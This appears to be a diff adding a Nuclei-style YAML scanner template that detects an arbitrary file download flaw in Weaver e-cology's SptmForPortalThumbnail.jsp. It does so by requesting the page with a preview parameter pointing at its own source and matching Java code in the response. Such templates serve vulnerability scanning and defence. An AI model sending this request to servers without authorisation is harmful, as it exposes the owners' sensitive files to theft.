@@ -1,0 +1,31 @@
+id: e-cology SptmForPortalThumbnail,任意文件下载
+time: '2021-04-08'
+
+
+info:
+  name: e-cology datas 信息泄露
+  author: pikpikcu
+  description: 泛微 SptmForPortalThumbnail.jsp 存在任意文件下载漏洞，攻击者可利用该漏洞获取系统敏感信息
+  severity: high
+  
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp"
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "page import=\"java.io\""
+          - "if(!imgFile.exists())imgPath =\""
+        condition: and
+
+      - type: status
+        status:
+          - 200
+    
